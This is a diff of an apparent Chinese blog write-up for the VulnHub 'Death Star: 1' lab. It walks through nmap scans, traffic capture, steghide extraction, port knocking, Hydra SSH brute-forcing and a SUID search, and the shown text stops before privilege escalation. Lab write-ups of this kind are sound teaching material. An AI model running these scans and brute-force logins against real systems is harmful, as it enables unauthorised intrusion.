@@ -26,7 +26,7 @@
 <meta property="og:url" content="https://7r1UMPH.github.io/post/VulnHub%20Death%20Star-%201%20-shen-tou-ce-shi-bao-gao.html">
 <meta property="og:image" content="https://7r1umph.top/image/202506121404919.webp">
 <title>VulnHub Death Star: 1 渗透测试报告</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -96,7 +96,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3bbf2489ae2d45ea2ea3f1a379d5d8601ecf4ebac7557f6f7fa7b83aeb911941/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531353134343334323233352e77656270"><img src="https://camo.githubusercontent.com/3bbf2489ae2d45ea2ea3f1a379d5d8601ecf4ebac7557f6f7fa7b83aeb911941/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531353134343334323233352e77656270" alt="image-20250515144334733" data-canonical-src="https://7r1UMPH.top/image/20250515144342235.webp" style="max-width: 100%;"></a></p>
 <h3>1. 主机发现与端口扫描</h3>
 <p>首先，使用 <code class="notranslate">arp-scan</code> 发现靶机 IP 地址。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
 └─$ sudo arp-scan -l     
 Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
@@ -106,151 +106,140 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 192.168.205.254 00:50:56:ee:d6:af       VMware, Inc.
 
 5 packets received by filter, 0 packets dropped by kernel
-Ending arp-scan 1.10.0: 256 hosts scanned in 1.977 seconds (129.49 hosts/sec). 4 responded
-</code></pre>
+Ending arp-scan 1.10.0: 256 hosts scanned <span class="pl-k">in</span> 1.977 seconds (129.49 hosts/sec). 4 responded</pre></div>
 <p>靶机 IP 为 <code class="notranslate">192.168.205.210</code>。</p>
 <p>尝试进行全端口快速扫描：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
 └─$ nmap -p- --min-rate 10000 192.168.205.210
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:32 EDT
-Nmap scan report for 192.168.205.210
+Nmap scan report <span class="pl-k">for</span> 192.168.205.210
 Host is up (0.00051s latency).
-All 65535 scanned ports on 192.168.205.210 are in ignored states.
+All 65535 scanned ports on 192.168.205.210 are <span class="pl-k">in</span> ignored states.
 Not shown: 65535 filtered tcp ports (no-response)
 MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 
-Nmap done: 1 IP address (1 host up) scanned in 13.51 seconds
-</code></pre>
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 13.51 seconds</pre></div>
 <p>没有扫描到开放端口，所有端口状态为 <code class="notranslate">ignored</code> 或 <code class="notranslate">filtered</code>。<br>
 确认主机是否连通：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
 └─$ ping 192.168.205.210
 PING 192.168.205.210 (192.168.205.210) 56(84) bytes of data.
 64 bytes from 192.168.205.210: icmp_seq=1 ttl=64 time=0.475 ms
 ...
 --- 192.168.205.210 ping statistics ---
-11 packets transmitted, 11 received, 0% packet loss, time 10231ms
-rtt min/avg/max/mdev = 0.285/0.325/0.475/0.050 ms
-</code></pre>
+11 packets transmitted, 11 received, 0% packet loss, <span class="pl-k">time</span> 10231ms
+rtt min/avg/max/mdev = 0.285/0.325/0.475/0.050 ms</pre></div>
 <p>主机是连通的。这表明可能有防火墙过滤了 TCP 端口扫描。</p>
 <p>尝试使用 <code class="notranslate">-Pn</code> (跳过主机发现) 和其他扫描技术：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
 └─$ sudo nmap -Pn -p- --min-rate 1000 192.168.205.210
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:44 EDT
-Nmap scan report for 192.168.205.210
+Nmap scan report <span class="pl-k">for</span> 192.168.205.210
 Host is up (0.00038s latency).
-All 65535 scanned ports on 192.168.205.210 are in ignored states.
+All 65535 scanned ports on 192.168.205.210 are <span class="pl-k">in</span> ignored states.
 Not shown: 65535 filtered tcp ports (no-response)
 MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 
-Nmap done: 1 IP address (1 host up) scanned in 131.46 seconds
-</code></pre>
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 131.46 seconds</pre></div>
 <p>尝试 ACK 扫描 (<code class="notranslate">-sA</code>) 来探测防火墙规则集：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
 └─$ sudo nmap -Pn -sA -p- --min-rate 1000 192.168.205.210
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:47 EDT
-Nmap scan report for 192.168.205.210
+Nmap scan report <span class="pl-k">for</span> 192.168.205.210
 Host is up (0.00038s latency).
-All 65535 scanned ports on 192.168.205.210 are in ignored states.
+All 65535 scanned ports on 192.168.205.210 are <span class="pl-k">in</span> ignored states.
 Not shown: 65535 filtered tcp ports (no-response)
 MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 
-Nmap done: 1 IP address (1 host up) scanned in 131.40 seconds
-</code></pre>
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 131.40 seconds</pre></div>
 <p>结果依旧。尝试 FIN, Xmas, Null 隐蔽扫描：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~]
-└─$ sudo nmap -Pn -sF -p- --min-rate 1000 192.168.205.210 &amp;&amp; \
-sudo nmap -Pn -sX -p- --min-rate 1000 192.168.205.210 &amp;&amp; \
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ sudo nmap -Pn -sF -p- --min-rate 1000 192.168.205.210 <span class="pl-k">&amp;&amp;</span> \
+sudo nmap -Pn -sX -p- --min-rate 1000 192.168.205.210 <span class="pl-k">&amp;&amp;</span> \
 sudo nmap -Pn -sN -p- --min-rate 1000 192.168.205.210
-# ... (三次扫描结果类似，均为 open|filtered 或 filtered)
-</code></pre>
+<span class="pl-c"><span class="pl-c">#</span> ... (三次扫描结果类似，均为 open|filtered 或 filtered)</span></pre></div>
 <p>TCP 端口扫描似乎都无法穿透防火墙。尝试 UDP 扫描：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
 └─$ nmap -sU --top-ports 100 192.168.205.210                                                                    
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:40 EDT
-Nmap scan report for 192.168.205.210
+Nmap scan report <span class="pl-k">for</span> 192.168.205.210
 Host is up (0.00035s latency).
 Not shown: 99 closed udp ports (port-unreach)
 PORT   STATE         SERVICE
-68/udp open|filtered dhcpc
+68/udp open<span class="pl-k">|</span>filtered dhcpc
 MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 
-Nmap done: 1 IP address (1 host up) scanned in 103.11 seconds
-</code></pre>
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 103.11 seconds</pre></div>
 <p>UDP 端口 68 (DHCP客户端) 通常不是可利用的入口。</p>
 <p>尝试分片扫描 (<code class="notranslate">-f</code>) 和源端口伪装 (<code class="notranslate">-g 53</code>)：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
 └─$ sudo nmap -Pn -sS -f -p- --min-rate 1000 192.168.205.210
-# ... (结果 filtered)
+<span class="pl-c"><span class="pl-c">#</span> ... (结果 filtered)</span>
                                                                       
 ┌──(kali㉿kali)-[~]
 └─$ sudo nmap -Pn -sS -g 53 -p- --min-rate 1000 192.168.205.210
-# ... (结果 filtered)
-</code></pre>
+<span class="pl-c"><span class="pl-c">#</span> ... (结果 filtered)</span></pre></div>
 <p>所有 TCP 扫描尝试均失败，看来需要另辟蹊径。</p>
 <h3>2. 流量捕获与信息获取</h3>
 <p>既然主动扫描效果不佳，尝试捕获靶机发出的流量，看是否有线索。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
 └─$ sudo tcpdump -i eth0 host 192.168.205.210 -nn                                    
-tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+tcpdump: verbose output suppressed, use -v[v]... <span class="pl-k">for</span> full protocol decode
 listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
-03:12:01.447736 IP 192.168.205.210.44226 &gt; 255.255.255.255.160: UDP, length 472
-03:12:01.447804 IP 192.168.205.210.44226 &gt; 255.255.255.255.160: UDP, length 472
-03:12:01.448295 IP 192.168.205.210.53472 &gt; 255.255.255.255.357: UDP, length 97
-03:12:01.448342 IP 192.168.205.210.53472 &gt; 255.255.255.255.357: UDP, length 97
-03:12:20.192762 IP 192.168.205.210.68 &gt; 192.168.205.254.67: BOOTP/DHCP, Request from 08:00:27:b2:99:5a, length 300
-03:12:20.192956 IP 192.168.205.254.67 &gt; 192.168.205.210.68: BOOTP/DHCP, Reply, length 300
+03:12:01.447736 IP 192.168.205.210.44226 <span class="pl-k">&gt;</span> 255.255.255.255.160: UDP, length 472
+03:12:01.447804 IP 192.168.205.210.44226 <span class="pl-k">&gt;</span> 255.255.255.255.160: UDP, length 472
+03:12:01.448295 IP 192.168.205.210.53472 <span class="pl-k">&gt;</span> 255.255.255.255.357: UDP, length 97
+03:12:01.448342 IP 192.168.205.210.53472 <span class="pl-k">&gt;</span> 255.255.255.255.357: UDP, length 97
+03:12:20.192762 IP 192.168.205.210.68 <span class="pl-k">&gt;</span> 192.168.205.254.67: BOOTP/DHCP, Request from 08:00:27:b2:99:5a, length 300
+03:12:20.192956 IP 192.168.205.254.67 <span class="pl-k">&gt;</span> 192.168.205.210.68: BOOTP/DHCP, Reply, length 300
 ^C
 6 packets captured
 6 packets received by filter
-0 packets dropped by kernel
-</code></pre>
+0 packets dropped by kernel</pre></div>
 <p>发现靶机向广播地址的 UDP 端口 160 和 357 发送数据。使用 <code class="notranslate">nc</code> 监听这两个端口：</p>
 <p>监听 UDP 160 端口：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
 └─$ sudo nc -ulnp 160 -vv
 listening on [any] 160 ...
 connect to [192.168.205.206] from (UNKNOWN) [192.168.205.210] 44380
 
 Thanks to the successful Operation Skyhook, the Rebel Alliance
-got some plans for the new weapon of the Galactic Empire. We
+got some plans <span class="pl-k">for</span> the new weapon of the Galactic Empire. We
 know that there is a small opening that we can explore through a
 thermal exhaust that is directly connected to the Main Reactor of the
 Death Star. The superlaser takes 1440 minutes to reload.
-It is very important to observe 'this window' in order to recover the blueprint.
+It is very important to observe <span class="pl-s"><span class="pl-pds">'</span>this window<span class="pl-pds">'</span></span> <span class="pl-k">in</span> order to recover the blueprint.
 This is because, it is only possible to make an attempt every 60 seconds.
 ^C sent 0, rcvd 472
 
-# 翻译
+<span class="pl-c"><span class="pl-c">#</span> 翻译</span>
 得益于“天钩行动”的成功，义军同盟
 获得了一些银河帝国新武器的图纸。我们
 知道有一个小开口，可以通过一个热排气口进行探索，这个排气口直接连接到死星的主反应堆。超级激光器需要1440分钟才能重新装填。
 为了获取蓝图，观察“这个窗口”至关重要。
-这是因为，每60秒只能尝试一次。
-</code></pre>
+这是因为，每60秒只能尝试一次。</pre></div>
 <p>监听 UDP 357 端口：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
 └─$ sudo nc -ulnp 357 -vv
-[sudo] password for kali: 
+[sudo] password <span class="pl-k">for</span> kali: 
 listening on [any] 357 ...
 connect to [192.168.205.206] from (UNKNOWN) [192.168.205.210] 45629
 
 
 Code to access the Death Star Blueprint
-within the time it takes to reload is:  DS-1@OBS     
+within the <span class="pl-k">time</span> it takes to reload is:  DS-1@OBS     
 
 ^C sent 0, rcvd 97
                    
-# 翻译
-在重新加载所需的时间内访问死星蓝图的代码是：DS-1@OBS
-</code></pre>
+<span class="pl-c"><span class="pl-c">#</span> 翻译</span>
+在重新加载所需的时间内访问死星蓝图的代码是：DS-1@OBS</pre></div>
 <p>从 UDP 160 端口的信息中提取到数字 <code class="notranslate">1440</code> 和 <code class="notranslate">60</code>。从 UDP 357 端口的信息中获取到访问代码 <code class="notranslate">DS-1@OBS</code>。<br>
 提示要观察一个 "窗口"，结合数字，猜测这可能是端口号。</p>
 <p>尝试扫描这些数字对应的 UDP 端口：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
 └─$ nmap -sU -p1440,24,60 192.168.205.210
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 03:39 EDT
-Nmap scan report for 192.168.205.210
+Nmap scan report <span class="pl-k">for</span> 192.168.205.210
 Host is up (0.00041s latency).
 
 PORT     STATE  SERVICE
@@ -259,46 +248,41 @@ PORT     STATE  SERVICE
 1440/udp open   eicon-slp
 MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 
-Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
-</code></pre>
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 0.30 seconds</pre></div>
 <p>UDP 1440 端口开放。</p>
 <h3>3. 获取图片与信息提取</h3>
 <p>向 UDP 1440 端口发送之前获取的代码 <code class="notranslate">DS-1@OBS</code>：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~]
-└─$ echo "DS-1@OBS" | sudo nc -u 192.168.205.210 1440 &gt; 1440.txt
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>DS-1@OBS<span class="pl-pds">"</span></span> <span class="pl-k">|</span> sudo nc -u 192.168.205.210 1440 <span class="pl-k">&gt;</span> 1440.txt</pre></div>
 <p>查看接收到的内容，发现是 Base64 编码的数据，开头为 <code class="notranslate">/9j/4AAQSkZJRg</code>，这是 JPEG 文件的典型特征。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
-└─$ cat 1440.txt | base64 -d &gt; 1440.jpg
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ cat 1440.txt <span class="pl-k">|</span> base64 -d <span class="pl-k">&gt;</span> 1440.jpg</pre></div>
 <p>(注: 实际操作中应确保数据完整接收，若图片不完整可能导致后续步骤失败。可以使用 <code class="notranslate">nc -u -w1</code> 设置超时。)</p>
 <p>打开图片 <code class="notranslate">1440.jpg</code>：<br>
 <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4021ddf00089f871bddc052451ed5e27c2af2d373afe9410d46bfc21081e4f06/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531353135343732323736342e77656270"><img src="https://camo.githubusercontent.com/4021ddf00089f871bddc052451ed5e27c2af2d373afe9410d46bfc21081e4f06/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531353135343732323736342e77656270" alt="image-20250515154643417" data-canonical-src="https://7r1UMPH.top/image/20250515154722764.webp" style="max-width: 100%;"></a><br>
 图片上显示解锁代码：<strong>197719801983</strong>。</p>
 <p>尝试对图片进行隐写分析。<code class="notranslate">strings</code> 和 <code class="notranslate">binwalk</code> 未发现明显线索。使用 <code class="notranslate">steghide</code>：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ steghide extract -sf 1440.jpg
 Enter passphrase: DS-1@OBS
-wrote extracted data to "openTheExhaust.txt".
+wrote extracted data to <span class="pl-s"><span class="pl-pds">"</span>openTheExhaust.txt<span class="pl-pds">"</span></span>.
                  
 ┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ cat openTheExhaust.txt       
-Each segment of the "unlock code" can only contain 3 characters sent in sequence to unlock port 10110.
+Each segment of the <span class="pl-s"><span class="pl-pds">"</span>unlock code<span class="pl-pds">"</span></span> can only contain 3 characters sent <span class="pl-k">in</span> sequence to unlock port 10110.
                    
-# 翻译
-“解锁码”每段只能包含3个字符，按顺序发送即可解锁10110端口。
-</code></pre>
+<span class="pl-c"><span class="pl-c">#</span> 翻译</span>
+“解锁码”每段只能包含3个字符，按顺序发送即可解锁10110端口。</pre></div>
 <p>使用之前获取的 <code class="notranslate">DS-1@OBS</code> 作为密码，成功提取出 <code class="notranslate">openTheExhaust.txt</code> 文件。内容提示解锁代码每段3个字符，用于解锁 10110 端口。</p>
 <h3>4. 端口敲门与 SSH 登录</h3>
 <p>根据提示，将解锁代码 <code class="notranslate">197719801983</code> 分割成 <code class="notranslate">197</code>, <code class="notranslate">719</code>, <code class="notranslate">801</code>, <code class="notranslate">983</code>，并进行端口敲门：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
-└─$ knock 192.168.205.210 197 719 801 983
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ knock 192.168.205.210 197 719 801 983</pre></div>
 <p>敲门后，扫描目标端口 10110：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ nmap -p10110 -sT -sU 192.168.205.210 
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 04:31 EDT
-Nmap scan report for 192.168.205.210
+Nmap scan report <span class="pl-k">for</span> 192.168.205.210
 Host is up (0.00035s latency).
 
 PORT      STATE  SERVICE
@@ -306,43 +290,40 @@ PORT      STATE  SERVICE
 10110/udp closed nmea-0183
 MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 
-Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
-</code></pre>
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 0.35 seconds</pre></div>
 <p>TCP 10110 端口已开放。探测服务版本：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ nmap -p10110 -sV 192.168.205.210    
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 04:32 EDT
-Nmap scan report for 192.168.205.210
+Nmap scan report <span class="pl-k">for</span> 192.168.205.210
 Host is up (0.00033s latency).
 
 PORT      STATE SERVICE VERSION
-10110/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+10110/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux<span class="pl-k">;</span> protocol 2.0)
 MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Service Info: OS: Linux<span class="pl-k">;</span> CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
-</code></pre>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="pl-c1">.</span>
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 0.47 seconds</pre></div>
 <p>端口 10110 运行的是 OpenSSH 6.6.1p1。尝试 SSH 登录，此时我们没有任何凭据，先用 root 试试：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ ssh root@192.168.205.210 -p 10110
-The authenticity of host '[192.168.205.210]:10110 ([192.168.205.210]:10110)' can't be established.
-ECDSA key fingerprint is SHA256:oXn/1IjNjNv4INght0MV2FrWXVvTB4QNM9Bx1aRRLos.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '[192.168.205.210]:10110' (ECDSA) to the list of known hosts.
-
-# ... ASCII Art ...
-                                                                          
-Devoloped by Galen Walton Erso
-System's user: erso
-Pass Hint: My wife's first name plus the year (BBY) she died.
-
-Glory to the Empire - Project DS-1: Orbital Battle Station
-
-
-root@192.168.205.210's password: 
-</code></pre>
+The authenticity of host <span class="pl-s"><span class="pl-pds">'</span>[192.168.205.210]:10110 ([192.168.205.210]:10110)<span class="pl-pds">'</span></span> can<span class="pl-s"><span class="pl-pds">'</span>t be established.</span>
+<span class="pl-s">ECDSA key fingerprint is SHA256:oXn/1IjNjNv4INght0MV2FrWXVvTB4QNM9Bx1aRRLos.</span>
+<span class="pl-s">This key is not known by any other names.</span>
+<span class="pl-s">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
+<span class="pl-s">Warning: Permanently added <span class="pl-pds">'</span></span>[192.168.205.210]:10110<span class="pl-s"><span class="pl-pds">'</span> (ECDSA) to the list of known hosts.</span>
+<span class="pl-s"></span>
+<span class="pl-s"># ... ASCII Art ...</span>
+<span class="pl-s">                                                                          </span>
+<span class="pl-s">Devoloped by Galen Walton Erso</span>
+<span class="pl-s">System<span class="pl-pds">'</span></span>s user: erso
+Pass Hint: My wife<span class="pl-s"><span class="pl-pds">'</span>s first name plus the year (BBY) she died.</span>
+<span class="pl-s"></span>
+<span class="pl-s">Glory to the Empire - Project DS-1: Orbital Battle Station</span>
+<span class="pl-s"></span>
+<span class="pl-s"></span>
+<span class="pl-s">root@192.168.205.210<span class="pl-pds">'</span></span>s password: </pre></div>
 <p>SSH 登录提示：</p>
 <ul>
 <li>用户名: <code class="notranslate">erso</code></li>
@@ -372,53 +353,50 @@ lyra
 Erso
 </code></pre>
 <p>使用 Hydra 进行爆破：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ hydra -l erso -P pass ssh://192.168.205.210 -s 10110 -I -u -f -e nsr -t 64    
-\Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+<span class="pl-cce">\H</span>ydra v9.5 (c) 2023 by van Hauser/THC <span class="pl-k">&amp;</span> David Maciejak - Please <span class="pl-k">do</span> not use <span class="pl-k">in</span> military or secret service organizations, or <span class="pl-k">for</span> illegal purposes (this is non-binding, these <span class="pl-k">***</span> ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-15 04:46:21
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[DATA] max 20 tasks per 1 server, overall 20 tasks, 20 login tries (l:1/p:20), ~1 try per task
+[DATA] max 20 tasks per 1 server, overall 20 tasks, 20 login tries (l:1/p:20), <span class="pl-k">~</span>1 try per task
 [DATA] attacking ssh://192.168.205.210:10110/
 [10110][ssh] host: 192.168.205.210   login: erso   password: lyra13
-[STATUS] attack finished for 192.168.205.210 (valid pair found)
+[STATUS] attack finished <span class="pl-k">for</span> 192.168.205.210 (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-15 04:46:22
-</code></pre>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-15 04:46:22</pre></div>
 <p>成功爆破出密码为 <code class="notranslate">lyra13</code>。<br>
 登录 SSH：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ ssh erso@192.168.205.210 -p 10110
-# ... (Login banner) ...
-erso@deathStar1:~$ id
-uid=1000(erso) gid=1000(erso) groups=1000(erso)
-</code></pre>
+<span class="pl-c"><span class="pl-c">#</span> ... (Login banner) ...</span>
+erso@deathStar1:<span class="pl-k">~</span>$ id
+uid=1000(erso) gid=1000(erso) groups=1000(erso)</pre></div>
 <p>成功登录用户 <code class="notranslate">erso</code>。</p>
 <h3>5. 提权</h3>
 <p>查看 <code class="notranslate">sudo</code> 权限和家目录下的文件：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">erso@deathStar1:~$ sudo -l
+<div class="highlight highlight-source-shell"><pre class="notranslate">erso@deathStar1:<span class="pl-k">~</span>$ sudo -l
 sudo: unable to resolve host deathStar1
-[sudo] password for erso: 
+[sudo] password <span class="pl-k">for</span> erso: 
 Sorry, user erso may not run sudo on deathStar1.
-erso@deathStar1:~$ ls -al
+erso@deathStar1:<span class="pl-k">~</span>$ ls -al
 total 28
-drwxr-xr-x 3 erso erso 4096 May  3  2020 .
+drwxr-xr-x 3 erso erso 4096 May  3  2020 <span class="pl-c1">.</span>
 drwxr-xr-x 3 root root 4096 May  3  2020 ..
-lrwxrwxrwx 1 root root    9 May  3  2020 .bash_history -&gt; /dev/null
+lrwxrwxrwx 1 root root    9 May  3  2020 .bash_history -<span class="pl-k">&gt;</span> /dev/null
 -rw-r--r-- 1 erso erso  220 May  3  2020 .bash_logout
 -rw-r--r-- 1 erso erso 3631 May  3  2020 .bashrc
 drwx------ 2 erso erso 4096 May  3  2020 .cache
 -rw-r--r-- 1 erso erso  690 May  3  2020 .profile
 -rw------- 1 erso erso  369 May  3  2020 warning.txt
-erso@deathStar1:~$ cat warning.txt 
+erso@deathStar1:<span class="pl-k">~</span>$ cat warning.txt 
 Message from GALEN ERSO:
-This is your chance. Destroy the plans of the Galactic Empire. I know that Lord Vader will not like this at all. But, this will be my chance for redemption. I hope you have enough knowledge to help destroy this new weapon.
-Explore the system and get 'root access' to read the secret message located at '/root/message.txt'. 
-Hack or fail!!
-</code></pre>
+This is your chance. Destroy the plans of the Galactic Empire. I know that Lord Vader will not like this at all. But, this will be my chance <span class="pl-k">for</span> redemption. I hope you have enough knowledge to <span class="pl-c1">help</span> destroy this new weapon.
+Explore the system and get <span class="pl-s"><span class="pl-pds">'</span>root access<span class="pl-pds">'</span></span> to <span class="pl-c1">read</span> the secret message located at <span class="pl-s"><span class="pl-pds">'</span>/root/message.txt<span class="pl-pds">'</span></span>. 
+Hack or fail<span class="pl-k">!!</span></pre></div>
 <p>提示 root flag 在 <code class="notranslate">/root/message.txt</code>。</p>
 <p>查找 SUID 文件：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">erso@deathStar1:~$ find / -perm -4000 -type f 2&gt;/dev/null
+<div class="highlight highlight-source-shell"><pre class="notranslate">erso@deathStar1:<span class="pl-k">~</span>$ find / -perm -4000 -type f <span class="pl-k">2&gt;</span>/dev/null
 /usr/bin/chfn
 /usr/bin/chsh
 /usr/bin/gpasswd
@@ -439,52 +417,46 @@ Hack or fail!!
 /bin/su
 /bin/ping6
 /bin/fusermount
-/bin/dartVader  &lt;-- 可疑
+/bin/dartVader  <span class="pl-k">&lt;</span>-- 可疑
 /bin/umount
 /bin/mount
-/bin/ping
-</code></pre>
+/bin/ping</pre></div>
 <p><code class="notranslate">/bin/dartVader</code> 是一个可疑的 SUID 文件，与靶机主题相关。</p>
 <p>分析 <code class="notranslate">/bin/dartVader</code>：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">erso@deathStar1:~$ ls -l /bin/dartVader
+<div class="highlight highlight-source-shell"><pre class="notranslate">erso@deathStar1:<span class="pl-k">~</span>$ ls -l /bin/dartVader
 -rwsr-xr-x 1 root root 7338 Nov  7  2019 /bin/dartVader
